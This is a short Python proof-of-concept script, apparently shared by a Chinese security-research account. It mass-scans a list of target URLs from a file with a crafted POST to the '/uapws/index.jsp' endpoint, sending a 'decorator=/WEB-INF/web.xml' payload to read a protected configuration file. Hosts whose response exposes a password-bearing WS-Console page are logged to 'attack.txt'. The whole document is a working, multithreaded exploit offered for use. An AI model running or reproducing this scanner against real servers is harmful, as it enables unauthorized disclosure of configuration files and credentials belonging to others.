import requests
import concurrent.futures

def check_vulnerability(target):
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)"
    }

    try:
        # print(target)
        res = requests.post(f"{target}/uapws/index.jsp", headers=headers, data=r"decorator=%2FWEB-INF%2Fweb.xml&confirm=true", timeout=5)
        if "Password:" in res.text and "name:" in res.text and "WS-Console" in res.text:
            print(f"[+]{target}漏洞存在")
            with open("attack.txt",'a') as fw:
                fw.write(f"{target}\n")
        else:
            print(f"[-]{target}漏洞不存在")
    except Exception as e:
        print(f"[-]{target}访问错误")

if __name__ == "__main__":
    print("------------------------")
    print("微信公众号:知攻善防实验室")
    print("------------------------")
    print("target.txt存放目标文件")
    print("attack.txt存放检测结果")
    print("------------------------")
    print("""POC:
    /uapws/index.jsp
    
    """)
    print("按回车继续")
    import os
    os.system("pause")
    f = open("target.txt", 'r')
    targets = f.read().splitlines()
    print(targets)

    # 使用线程池并发执行检查漏洞
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(check_vulnerability, targets)
